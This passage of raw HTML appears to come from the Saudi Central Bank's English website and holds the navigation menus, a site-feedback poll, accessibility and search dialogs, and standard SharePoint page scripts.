                                        <ul class="mobile-submenu mobile-mega-menu"><li class="mobile-mega-menu__section"><a class="mobile-mega-menu__title" href="https://rulebook.sama.gov.sa/en">Rulebook</a></li><li class="mobile-mega-menu__section"><span class="mobile-mega-menu__title">Licenses and Permits</span><ul class="mobile-mega-menu__list"><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/Supervision/LicenseEntities/Pages/default.aspx">Licensed Entities</a></li></ul></li><li class="mobile-mega-menu__section"><span class="mobile-mega-menu__title">The Regulatory Sandbox</span><ul class="mobile-mega-menu__list"><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/Supervision/SandBox/Pages/default.aspx">Overview</a></li><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/Supervision/SandBox/Pages/permitted-fintechs.aspx">Permitted Fintechs</a></li><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/Supervision/SandBox/Documents/Regulatory_Sandbox-Application_Guidance_Notes_EN.pdf">Guidebook</a></li><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/Pages/ServiceDetails.aspx?serviceid=96">Join the Regulatory Sandbox​</a></li></ul></li><li class="mobile-mega-menu__section"><a class="mobile-mega-menu__title" href="https://www.sama.gov.sa/en-US/Supervision/Pages/holidayschedules.aspx">Holidays and Working Hours</a></li></ul></li><li class="mobile-nav-item has-submenu">
                                        <div class="mobile-nav-header">
                                            <a class="mobile-nav-link" href="https://www.sama.gov.sa/en-US/Statistics/Pages/default.aspx" title="Statistics">Statistics</a>
                                            <button class="mobile-submenu-toggle" type="button">
                                                <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
                                                    <path d="M4 6L8 10L12 6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                                                </svg>
                                            </button>
                                        </div>
                                        <ul class="mobile-submenu mobile-mega-menu"><li class="mobile-mega-menu__section"><span class="mobile-mega-menu__title">Statistics</span><ul class="mobile-mega-menu__list"><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/Statistics/Pages/Summary.aspx">Saudi Central Bank Portal For Open Data</a></li><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/Statistics/Pages/MonthlyStatistics.aspx">Monthly Bulletin Statistics</a></li><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/Statistics/Pages/AdvancedReleaseCalendar.aspx">Publication Timeline</a></li></ul></li><li class="mobile-mega-menu__section"><span class="mobile-mega-menu__title">Economic Indicators</span><ul class="mobile-mega-menu__list"><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/Statistics/Indices/Pages/WeeklyMoneySupply.aspx">Weekly Money Supply</a></li><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/Statistics/Indices/Pages/POS.aspx">Weekly Points of Sale Transactions</a></li><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/Statistics/Indices/Pages/reserve_assets.aspx">Reserve Assets</a></li><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/Statistics/Indices/Pages/International_Reserves.aspx">Data Template on International Reserves and Foreign Currency Liquidity</a></li><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/Statistics/Indices/Pages/Central_Bank_Survey.aspx">Saudi Central Bank survey</a></li></ul></li></ul></li><li class="mobile-nav-item has-submenu">
                                        <div class="mobile-nav-header">
                                            <a class="mobile-nav-link" href="https://www.sama.gov.sa/en-US/Publications" title="Publications">Publications</a>
                                            <button class="mobile-submenu-toggle" type="button">
                                                <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
                                                    <path d="M4 6L8 10L12 6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                                                </svg>
                                            </button>
                                        </div>
                                        <ul class="mobile-submenu mobile-mega-menu"><li class="mobile-mega-menu__section"><span class="mobile-mega-menu__title">Economic Reports</span><ul class="mobile-mega-menu__list"><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/Publications/EconomicReports/Pages/AnnualReport.aspx">Annual Report</a></li><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/Publications/EconomicReports/Pages/InflationReport.aspx">Inflation Report</a></li><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/Publications/EconomicReports/Pages/DevelopmentReports.aspx">Key Economic Developments Report</a></li></ul></li><li class="mobile-mega-menu__section"><span class="mobile-mega-menu__title">Economic Research</span><ul class="mobile-mega-menu__list"><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/Publications/EconomicResearch/Pages/WorkingPapers.aspx">Working Papers</a></li><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/Publications/EconomicResearch/Pages/Joint_Research_Program.aspx">Joint Research Program</a></li></ul></li><li class="mobile-mega-menu__section"><span class="mobile-mega-menu__title">Financial Reports</span><ul class="mobile-mega-menu__list"><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/Publications/FinanceReports/Pages/FinancialStability.aspx">Financial Stability Report</a></li><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/Publications/FinanceReports/Pages/FinancialPerformanceReport.aspx">Finance Sector Performance Report</a></li><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/Publications/FinanceReports/Pages/AnnualFintechReport.aspx">Annual Fintech Report</a></li></ul></li><li class="mobile-mega-menu__section"><span class="mobile-mega-menu__title">Other Reports</span><ul class="mobile-mega-menu__list"><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/Publications/OtherReports/Pages/default.aspx">National Payments Usage Study Report</a></li></ul></li></ul></li><li class="mobile-nav-item has-submenu">
                                        <div class="mobile-nav-header">
                                            <a class="mobile-nav-link" href="https://www.sama.gov.sa/en-US/MonetaryPolicy/Pages/default.aspx" title="Monetary Policy">Monetary Policy</a>
                                            <button class="mobile-submenu-toggle" type="button">
                                                <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
                                                    <path d="M4 6L8 10L12 6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                                                </svg>
                                            </button>
                                        </div>
                                        <ul class="mobile-submenu mobile-mega-menu"><li class="mobile-mega-menu__section"><span class="mobile-mega-menu__title">Monetary Policy Tools</span><ul class="mobile-mega-menu__list"><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/MonetaryPolicy/MonetaryPolicyTools/Pages/RepoRate.aspx">Repo Rate</a></li><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/MonetaryPolicy/MonetaryPolicyTools/Pages/ReverseRepoRate.aspx">Reverse Repo Rate</a></li><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/MonetaryPolicy/MonetaryPolicyTools/Pages/DemandDeposits.aspx">Reserve Requirement on Demand Deposits</a></li><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/MonetaryPolicy/MonetaryPolicyTools/Pages/SavingDeposits.aspx">Reserve Requirement on Saving Deposits</a></li></ul></li><li class="mobile-mega-menu__section"><span class="mobile-mega-menu__title">Monetary Operations</span><ul class="mobile-mega-menu__list"><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/MonetaryPolicy/MonetaryOperations/OpenMarketOperations/Pages/default.aspx">Open Market Operations</a></li><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/MonetaryPolicy/MonetaryOperations/Pages/AverageWeeklyRepoRate.aspx">The Weekly Average of Repo and Reverse Repo</a></li></ul></li></ul></li><li class="mobile-nav-item has-submenu">
                                        <div class="mobile-nav-header">
                                            <a class="mobile-nav-link" href="https://www.sama.gov.sa/en-US/Currency/Pages/default.aspx" title="Currency">Currency</a>
                                            <button class="mobile-submenu-toggle" type="button">
                                                <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
                                                    <path d="M4 6L8 10L12 6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                                                </svg>
                                            </button>
                                        </div>
                                        <ul class="mobile-submenu mobile-mega-menu"><li class="mobile-mega-menu__section"><span class="mobile-mega-menu__title">Saudi Currency History</span><ul class="mobile-mega-menu__list"><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/Currency/Pages/HistoricalInfo.aspx">Overview</a></li></ul></li><li class="mobile-mega-menu__section"><span class="mobile-mega-menu__title">Security Features</span><ul class="mobile-mega-menu__list"><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/Currency/SecurityFeatures/Pages/securityfeature.aspx">Security Features for Fifth Issue</a></li><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/Currency/SecurityFeatures/Pages/SixthIssueSecurityFeatures.aspx">Security Features for Sixth Issue</a></li></ul></li><li class="mobile-mega-menu__section"><span class="mobile-mega-menu__title">Saudi Currency Issues</span><ul class="mobile-mega-menu__list"><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/Currency/Pages/Pilgriams.aspx">Pilgrims’ Receipts</a></li><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/Currency/Pages/FirstIssue.aspx">First Issue</a></li><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/Currency/Pages/SecondIssue.aspx">Second Issue</a></li><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/Currency/Pages/ThirdIssue.aspx">Third Issue</a></li><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/Currency/Pages/FourthIssue.aspx">Fourth Issue</a></li><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/Currency/Pages/FifthIssue.aspx">Fifth Issue</a></li><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/Currency/Pages/SixthIssue.aspx">Sixth Issue</a></li><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/Currency/Pages/SpecialIssue.aspx">Special Issues</a></li></ul></li><li class="mobile-mega-menu__section"><span class="mobile-mega-menu__title">Exchange Rates</span><ul class="mobile-mega-menu__list"><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/Currency/FinExc/Pages/ExchangeRatesGregorian.aspx">Monthly Exchange Rates</a></li><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/Currency/FinExc/Pages/Currency.aspx">Exchange Rate</a></li><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/Currency/Pages/CurrencyConverter.aspx">Currency Converter</a></li></ul></li><li class="mobile-mega-menu__section"><span class="mobile-mega-menu__title">Saudi Riyal Symbol</span><ul class="mobile-mega-menu__list"><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/Currency/SRS/Pages/default.aspx">Overview</a></li><li><a class="mobile-submenu-link mobile-mega-menu__link" href="https://www.sama.gov.sa/en-US/Currency/SRS/Pages/Guideline.aspx">Saudi Riyal Symbol Guidelines</a></li></ul></li></ul></li><li class="mobile-nav-item has-submenu">
                                        <div class="mobile-nav-header">
                                            <a class="mobile-nav-link active" href="https://www.sama.gov.sa/en-US/payment" title="Payment Systems">Payment Systems</a>
                                            <button class="mobile-submenu-toggle" type="button">
                                                <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
                                                    <path d="M4 6L8 10L12 6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                                                </svg>
                                            </button>
                                        </div>
                                        <ul class="mobile-submenu mobile-mega-menu"><li class="mobile-mega-menu__section"><a class="mobile-mega-menu__title" href="https://www.sama.gov.sa/en-US/payment/Pages/SADAD.aspx">SADAD</a></li><li class="mobile-mega-menu__section"><a class="mobile-mega-menu__title" href="https://www.sama.gov.sa/en-US/payment/Pages/mada.aspx">mada</a></li><li class="mobile-mega-menu__section"><a class="mobile-mega-menu__title" href="https://www.sama.gov.sa/en-US/payment/Pages/Sarie.aspx">sarie</a></li><li class="mobile-mega-menu__section"><a class="mobile-mega-menu__title" href="https://www.sama.gov.sa/en-US/payment/Pages/Esal.aspx">Esal</a></li></ul></li><li class="mobile-nav-item">
                                    <a class="mobile-nav-link" href="https://www.sama.gov.sa/en-US/Pages/landingservices.aspx" title="E-Services">E-Services</a>
                                </li></ul>
           </nav>
        </div>
        <div class="offcanvas-footer">
           <div class="offcanvas-footer__container">
              <ul class="inline-list-links top-links"><li class="inline-list-links__item" data-pid="5">
											<a href="http://careers.sama.gov.sa/ar/" title="Careers" class="list-link">
												<span class="top-header-text">Careers</span>
											</a>
										</li><li class="inline-list-links__item" data-pid="5">
											<a href="/en-US/PortalServices/Pages/contactus.aspx" title="Contact Us" class="list-link">
												<span class="top-header-text">Contact Us</span>
											</a>
										</li><li class="inline-list-links__item" data-pid="5">
											<a href="/en-us/PortalServices/Pages/sitemap.aspx" title="Sitemap" class="list-link">
												<span class="top-header-text">Sitemap</span>
											</a>
										</li></ul>
              <div class="footer-actions">
                 <div class="actions-btns">
                    <div class="actions-btns__item d-flex d-sm-none">
                       <a class="actions-btn" data-bs-toggle="modal" data-bs-target="#surveyModal" data-bs-custom-class="tooltip-modal" data-bs-placement="top" title="Public Opinion Poll">
                          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none">
                             <path d="M21.1875 5.4375C22.6373 5.4375 23.8125 6.61278 23.8125 8.0625V18.8438C23.8125 20.2935 22.6373 21.4687 21.1875 21.4688H15.7324L12.1348 23.1777L11.0625 23.6865V21.4688H9.9375C8.48771 21.4688 7.3125 20.2935 7.3125 18.8438V18.0938H8.8125V18.8438C8.8125 19.4651 9.31616 19.9688 9.9375 19.9688H12.5625V21.3135L15.2402 20.041L15.3936 19.9688H21.1875C21.8088 19.9687 22.3125 19.4651 22.3125 18.8438V8.0625C22.3125 7.44119 21.8088 6.9375 21.1875 6.9375H18.5625V5.4375H21.1875ZM14.0625 0.1875C15.5123 0.187501 16.6875 1.36278 16.6875 2.8125V14.0625C16.6875 15.5122 15.5123 16.6875 14.0625 16.6875H8.61426L5.02246 18.4834L3.9375 19.0264V16.6875H2.8125C1.36271 16.6875 0.1875 15.5122 0.1875 14.0625V2.8125C0.1875 1.36278 1.36271 0.1875 2.8125 0.1875H14.0625ZM2.8125 1.6875C2.19116 1.6875 1.6875 2.19119 1.6875 2.8125V14.0625C1.6875 14.6838 2.19116 15.1875 2.8125 15.1875H5.4375V16.5996L8.10254 15.2666L8.26074 15.1875H14.0625C14.6838 15.1875 15.1875 14.6838 15.1875 14.0625V2.8125C15.1875 2.19119 14.6838 1.6875 14.0625 1.6875H2.8125ZM9.1875 13.125H7.6875V11.25H9.1875V13.125ZM8.4375 3.9375C9.88721 3.9375 11.0624 5.1129 11.0625 6.5625C11.0624 7.57256 10.4911 8.44837 9.6582 8.88672C9.39184 9.0271 9.18758 9.37074 9.1875 9.20078H7.6875C7.68758 8.94854 8.09144 8.01555 8.95996 7.55859C9.31957 7.36929 9.56244 6.99379 9.5625 6.5625C9.56237 5.9413 9.05876 5.4375 8.4375 5.4375C7.81624 5.4375 7.31263 5.9413 7.3125 6.5625H5.8125C5.81263 5.1129 6.98779 3.9375 8.4375 3.9375Z" fill="#002717"></path>
                          </svg>
                       </a>
                    </div>
                    <div class="actions-btns__item d-flex d-sm-none">
                       <a href="#" class="actions-btn" data-bs-toggle="modal" data-bs-target="#accessibilityModal" data-bs-custom-class="tooltip-modal" data-bs-placement="top" title="Accessibility Options">
                          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="28" viewBox="0 0 24 28" fill="none">
                             <path d="M1.88672 7.36035C2.46992 6.1945 3.86114 5.71846 5.03516 6.30469L10.9414 9.25H13.0361L18.9424 6.30469L19.1006 6.22559H19.1592C20.2018 5.81817 21.3965 6.2081 22.002 7.14844L22.1211 7.35547L22.127 7.36621C22.6917 8.51963 22.2206 9.92262 21.0742 10.5078L21.0674 10.5117V10.5107L15.9629 13.0566V18.0449L18.8604 23.251H18.8594C19.4985 24.3902 19.0658 25.8167 17.9482 26.4453C17.5797 26.6526 17.1972 26.75 16.7969 26.75C15.9847 26.75 15.1787 26.3313 14.749 25.5479L12.0049 20.6113L9.26074 25.5488L9.25879 25.5518C8.83527 26.3047 8.03834 26.75 7.21289 26.75C6.83264 26.75 6.43312 26.6613 6.06738 26.4482V26.4492C6.06547 26.4482 6.06343 26.4464 6.06152 26.4453C6.05551 26.4418 6.04896 26.4391 6.04297 26.4355V26.4336C4.91342 25.7938 4.52024 24.3731 5.14941 23.251L8.04688 18.0449V13.0566L2.94238 10.5107H2.94141C1.77773 9.9288 1.29774 8.52151 1.88672 7.36035ZM11.9971 1.25C14.1712 1.25005 15.9473 3.02601 15.9473 5.2002C15.9472 7.37429 14.1712 9.15034 11.9971 9.15039C9.82292 9.15039 8.04698 7.37432 8.04688 5.2002C8.04688 3.02598 9.82286 1.25 11.9971 1.25Z" stroke="#002717" stroke-width="1.5"></path>
                          </svg>
                       </a>
                    </div>
                 </div>
              </div>
           </div>
        </div>
     </div>
     <!--Survey Modal-->
     <div class="modal fade" id="surveyModal" tabindex="-1" aria-labelledby="surveyModalLabel" aria-hidden="true">
            <div class="modal-dialog modal-dialog-centered">
               <div class="modal-content">
                  <div class="modal-header">
                     <h1 class="modal-title" id="surveyModalLabel">Public opinion poll</h1>
                     <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                  </div>
                  <div class="modal-body">
                     <div class="survey-form"><div class="survey-form__header">
									<h6 class="survey__title">How do you evaluate your experience with the new central bank website?</h6>
									<span class="sub-title">Last date to participate:<span>May 30, 2026</span></span>
								</div>
								<div class="survey-form__body"><div class="checkForm-list" data-showresults="true"><label for="votingOption0" class="checkForm-list__item">
											<div class="form-check">
												<input class="form-check-input" name="votingOption" value="2" type="radio" id="votingOption0">
												<label class="form-check-label" for="votingOption0">Excellent</label>
											</div>
										</label><label for="votingOption1" class="checkForm-list__item">
											<div class="form-check">
												<input class="form-check-input" name="votingOption" value="1" type="radio" id="votingOption1">
												<label class="form-check-label" for="votingOption1">Good</label>
											</div>
										</label><label for="votingOption2" class="checkForm-list__item">
											<div class="form-check">
												<input class="form-check-input" name="votingOption" value="3" type="radio" id="votingOption2">
												<label class="form-check-label" for="votingOption2">Accepted</label>
											</div>
										</label></div></div><div class="survey-form__footer">
										<a class="btn btn-with-icon primary" onclick="AnswerVote();">Vote
											<span class="icon">
												<svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 22 22" fill="none">
													<path d="M15.066 4.64154C15.3882 4.31936 15.9115 4.31936 16.2337 4.64154L21.4834 9.89232C21.8056 10.2145 21.8056 10.7367 21.4834 11.0589L16.2337 16.3097C15.9115 16.6319 15.3882 16.6319 15.066 16.3097C14.7438 15.9875 14.7438 15.4642 15.066 15.142L18.9085 11.3006H1.1001L1.1001 9.65062H18.9085L15.066 5.80922C14.7438 5.48703 14.7438 4.96372 15.066 4.64154Z" fill="#fff"></path>
												</svg>
											</span>
										</a>
										<a class="btn btn-outline-gray" onclick="getResults();">Results</a>
									</div></div>
                  </div>
               </div>
            </div>
         </div>     
         <div class="modal fade" id="accessibilityModal" tabindex="-1" aria-labelledby="accessibilityModalLabel" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered">
           <div class="modal-content">
              <div class="modal-header">
                 <h1 class="modal-title" id="accessibilityModalLabel">
                 	Accessibility Options
                    
                 </h1>
                 <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
              </div>
              <div class="modal-body">
                 <div class="accessibility-list">
                    <div class="accessibility-list__item">
                       <div class="accessibility-list__item__header">
                          <img src="/_layouts/15/SAMA.Portal/assets/images/accessibility/text.svg" alt="icon" class="icon">
                          <span class="title">
                          	Text size
		                    
                          </span>
                       </div>
                       <div class="accessibility-list__item__body">
                          <div class="font-control">
                             <button class="font-control__item font-minus"></button>
                             <div class="font-value">100%</div>
                             <button class="font-control__item font-plus"></button>
                             <button class="font-control__item font-reset primary"></button>
                          </div>
                       </div>
                    </div>
                    <div class="accessibility-list__item">
                       <div class="accessibility-list__item__header">
                          <img src="/_layouts/15/SAMA.Portal/assets/images/accessibility/contrast.svg" alt="icon" class="icon">
                          <span class="title">
                          	High contrast
		                    
                          </span>
                          <div class="item-actions">
                             <!-- Contrast Switch -->
                             <div class="form-check form-switch">
                                <input class="form-check-input contrast-switch" type="checkbox" role="switch" id="contrastSwitch">
                             </div>
                          </div>
                       </div>
                    </div>
                    <div class="accessibility-list__item">
                       <div class="accessibility-list__item__header">
                          <img src="/_layouts/15/SAMA.Portal/assets/images/accessibility/grayScale.svg" alt="icon" class="icon">
                          <span class="title">
                          	Grayscale Mode
		                    
                          </span>
                          <div class="item-actions">
                             <!-- Theme Switch -->
                             <div class="form-check form-switch">
                                <input class="form-check-input theme-switch" type="checkbox" role="switch" id="themeSwitch">
                             </div>
                          </div>
                       </div>
                    </div>
                    <!-- <div class="accessibility-list__item">
                       <div class="accessibility-list__item__header">
                          <img src="/_layouts/15/SAMA.Portal/assets/images/accessibility/sound.svg" alt="icon" class="icon" />
                          <span class="title">
                          	Screen reader
		                    
                          </span>
                       </div>
                    </div> --> 
                 </div>
              </div>
           </div>
        </div>
     </div>
     <!--Search Modal-->
     <div class="modal fade search-modal" id="searchModal" tabindex="-1" aria-labelledby="searchModalLabel" aria-hidden="true">
        <div class="modal-dialog">
           <div class="modal-content">
              <div class="modal-header">
                 <h3 class="modal-title" id="searchModalLabel">
					Search the website
					
                 </h3>
                 <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
              </div>
              <div class="modal-body">
                 <div class="modal-search-container">
                    <input type="search" id="searchInputRes" class="search-input form-control" placeholder="Search the website ...">
					<a href="javascript:searchSite(true);" class="btn btn-primary">Search</a>
					
                    
                 </div>
              </div>
           </div>
        </div>
     </div>
     <!-- Survey Offcancas-->
     <div class="offcanvas offcanvas-end bottom-offcanvas" tabindex="-1" id="surveyOffcanvas" aria-labelledby="surveyOffcanvasLabel">
            <div class="offcanvas-header">
               <h5 class="offcanvas-title" id="surveyOffcanvasLabel">Public opinion poll</h5>
               <button type="button" class="btn-close" data-bs-dismiss="offcanvas" aria-label="Close"></button>
            </div>
            <div class="offcanvas-body">
               <div class="survey-form"><div class="survey-form__header">
									<h6 class="survey__title">How do you evaluate your experience with the new central bank website?</h6>
									<span class="sub-title">Last date to participate:<span>May 30, 2026</span></span>
								</div>
								<div class="survey-form__body"><div class="checkForm-list" data-showresults="true"><label for="votingOption0" class="checkForm-list__item">
											<div class="form-check">
												<input class="form-check-input" name="votingOption" value="2" type="radio" id="votingOption0">
												<label class="form-check-label" for="votingOption0">Excellent</label>
											</div>
										</label><label for="votingOption1" class="checkForm-list__item">
											<div class="form-check">
												<input class="form-check-input" name="votingOption" value="1" type="radio" id="votingOption1">
												<label class="form-check-label" for="votingOption1">Good</label>
											</div>
										</label><label for="votingOption2" class="checkForm-list__item">
											<div class="form-check">
												<input class="form-check-input" name="votingOption" value="3" type="radio" id="votingOption2">
												<label class="form-check-label" for="votingOption2">Accepted</label>
											</div>
										</label></div></div><div class="survey-form__footer">
										<a class="btn btn-with-icon primary" onclick="AnswerVote();">Vote
											<span class="icon">
												<svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 22 22" fill="none">
													<path d="M15.066 4.64154C15.3882 4.31936 15.9115 4.31936 16.2337 4.64154L21.4834 9.89232C21.8056 10.2145 21.8056 10.7367 21.4834 11.0589L16.2337 16.3097C15.9115 16.6319 15.3882 16.6319 15.066 16.3097C14.7438 15.9875 14.7438 15.4642 15.066 15.142L18.9085 11.3006H1.1001L1.1001 9.65062H18.9085L15.066 5.80922C14.7438 5.48703 14.7438 4.96372 15.066 4.64154Z" fill="#fff"></path>
												</svg>
											</span>
										</a>
										<a class="btn btn-outline-gray" onclick="getResults();">Results</a>
									</div></div>
            </div>
         </div>
     <!-- Accessibility Offcancas-->
     <div class="offcanvas offcanvas-end bottom-offcanvas bottom-offcanvas-sm" tabindex="-1" id="accessibilityOffcanvas" aria-labelledby="accessibilityOffcanvasLabel">
            <div class="offcanvas-header">
               <h5 class="offcanvas-title" id="accessibilityOffcanvasLabel">
               	Accessibility Options
                    
               </h5>
               <button type="button" class="btn-close" data-bs-dismiss="offcanvas" aria-label="Close"></button>
            </div>
            <div class="offcanvas-body">
               <div class="accessibility-list">
                  <div class="accessibility-list__item">
                     <div class="accessibility-list__item__header">
                        <img src="/_layouts/15/SAMA.Portal/assets/images/accessibility/text.svg" alt="icon" class="icon">
                        <span class="title">
                        	Text size
		                    
                        </span>
                     </div>
                     <div class="accessibility-list__item__body">
                        <div class="font-control">
                           <button class="font-control__item font-minus"></button>
                           <div class="font-value">100%</div>
                           <button class="font-control__item font-plus"></button>
                           <button class="font-control__item font-reset primary"></button>
                        </div>
                     </div>
                  </div>
                  <div class="accessibility-list__item">
                     <div class="accessibility-list__item__header">
                        <img src="/_layouts/15/SAMA.Portal/assets/images/accessibility/contrast.svg" alt="icon" class="icon">
                        <span class="title">
                        	High contrast
		                    
                        </span>
                        <div class="item-actions">
                           <!-- Contrast Switch -->
                           <div class="form-check form-switch">
                              <input class="form-check-input contrast-switch" type="checkbox" role="switch" id="contrastSwitch2">
                           </div>
                        </div>
                     </div>
                  </div>
                  <div class="accessibility-list__item">
                     <div class="accessibility-list__item__header">
                        <img src="/_layouts/15/SAMA.Portal/assets/images/accessibility/grayScale.svg" alt="icon" class="icon">
                        <span class="title">
                        	Grayscale Mode
		                    
                        </span>
                        <div class="item-actions">
                           <!-- Theme Switch -->
                           <div class="form-check form-switch">
                              <input class="form-check-input theme-switch" type="checkbox" role="switch" id="themeSwitch2">
                           </div>
                        </div>
                     </div>
                  </div>
                  <!-- <div class="accessibility-list__item">
                     <div class="accessibility-list__item__header">
                        <img src="/_layouts/15/SAMA.Portal/assets/images/accessibility/sound.svg" alt="icon" class="icon" />
                        <span class="title">
                        	Screen reader
		                    
                        </span>
                     </div>
                  </div> -->
               </div>
            </div>
         </div>
      

<script type="text/javascript">
//<![CDATA[
var _spFormDigestRefreshInterval = 1440000;window.SPThemeUtils && SPThemeUtils.ApplyCurrentTheme(true); IsSPSocialSwitchEnabled = function() { return true; };var _fV4UI = true;
function _RegisterWebPartPageCUI()
{
    var initInfo = {editable: false,isEditMode: false,allowWebPartAdder: false,listId: "{63100379-0682-4849-a57f-ab28091d0776}",itemId: 21,recycleBinEnabled: true,enableMinorVersioning: true,enableModeration: false,forceCheckout: true,rootFolderUrl: "\u002fen-US\u002fpayment\u002fPages",itemPermissions:{High:16,Low:196673}};
    SP.Ribbon.WebPartComponent.registerWithPageManager(initInfo);
    var wpcomp = SP.Ribbon.WebPartComponent.get_instance();
    var hid;
    hid = document.getElementById("_wpSelected");
    if (hid != null)
    {
        var wpid = hid.value;
        if (wpid.length > 0)
        {
            var zc = document.getElementById(wpid);
            if (zc != null)
                wpcomp.selectWebPart(zc, false);
        }
    }
    hid = document.getElementById("_wzSelected");
    if (hid != null)
    {
        var wzid = hid.value;
        if (wzid.length > 0)
        {
            wpcomp.selectWebPartZone(null, wzid);
        }
    }
};
function __RegisterWebPartPageCUI() {
ExecuteOrDelayUntilScriptLoaded(_RegisterWebPartPageCUI, "sp.ribbon.js");}
_spBodyOnLoadFunctionNames.push("__RegisterWebPartPageCUI");var __wpmExportWarning='This Web Part Page has been personalized. As a result, one or more Web Part properties may contain confidential information. Make sure the properties contain information that is safe for others to read. After exporting this Web Part, view properties in the Web Part description file (.WebPart) by using a text editor such as Microsoft Notepad.';var __wpmCloseProviderWarning='You are about to close this Web Part.  It is currently providing data to other Web Parts, and these connections will be deleted if this Web Part is closed.  To close this Web Part, click OK.  To keep this Web Part, click Cancel.';var __wpmDeleteWarning='You are about to permanently delete this Web Part.  Are you sure you want to do this?  To delete this Web Part, click OK.  To keep this Web Part, click Cancel.';var g_clientIdDeltaPlaceHolderMain = "DeltaPlaceHolderMain";
var g_clientIdDeltaPlaceHolderUtilityContent = "DeltaPlaceHolderUtilityContent";
//]]>
</script>
</form>
      
			<script type="text/javascript">//<![CDATA[
        var formDigestElement = document.getElementsByName('__REQUESTDIGEST')[0];
        if (!((formDigestElement == null) || (formDigestElement.tagName.toLowerCase() != 'input') || (formDigestElement.type.toLowerCase() != 'hidden') ||
            (formDigestElement.value == null) || (formDigestElement.value.length <= 0)))
        {
            formDigestElement.value = '0xACFCCC7B3D54351FF1A6011A1C3166A48180A70407F8C15641E344F6C3E355044840A31ACE8CF819D7146CC8C446C17FF2EAEA663DD89AB819C4E9578ABB7700,08 May 2026 22:25:44 -0000';_spPageContextInfo.updateFormDigestPageLoaded = new Date();
        }
        //]]>
        </script>
      
      <span id="DeltaPlaceHolderUtilityContent">
         
      </span>
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
